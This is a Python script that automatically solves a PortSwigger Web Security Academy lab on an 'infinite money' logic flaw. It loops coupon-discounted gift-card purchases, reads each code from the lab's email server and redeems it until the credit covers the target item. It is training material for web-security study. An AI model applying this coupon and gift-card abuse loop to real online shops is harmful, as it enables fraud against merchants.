# https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money

import requests
from bs4 import BeautifulSoup
import re

url = 'https://....web-security-academy.net'
url_email = 'https://exploit-....exploit-server.net/email'
s = requests.Session()


def get_csrf_token(r: requests.Response):

    return BeautifulSoup(r.text, 'html.parser').find('input', {'name': 'csrf'}).get('value')

def buy_product(s: requests.Session, product_id: int):

    body = {
        'productId': product_id,
        'quantity': 1,
        'redir': 'CART'
    }
    r = s.post(f'{url}/cart', body)
    
    body = {
        'coupon': 'SIGNUP30',
        'csrf': get_csrf_token(r)
    }
    r = s.post(f'{url}/cart/coupon', body)

    body = {
        'csrf': get_csrf_token(r)
    }
    r = s.post(f'{url}/cart/checkout', body)


r = s.get(f'{url}/login')

body = {
    'username': 'wiener',
    'password': 'peter',
    'csrf': get_csrf_token(r)
}
r = s.post(f'{url}/login', body)

for i in range(279):

    buy_product(s, product_id=2)

    r = s.get(url_email)

    last_email = BeautifulSoup(r.text, 'html.parser').find('pre').text
    gift_code = re.findall(r'\n([a-zA-Z0-9]{10})\n', last_email)[0]
    print(gift_code)

    r = s.get(f'{url}/my-account')

    body = {
        'gift-card': gift_code,
        'csrf': get_csrf_token(r)
    }
    r = s.post(f'{url}/gift-card', body)

buy_product(s, product_id=1)
print('Bought l33t jacket')
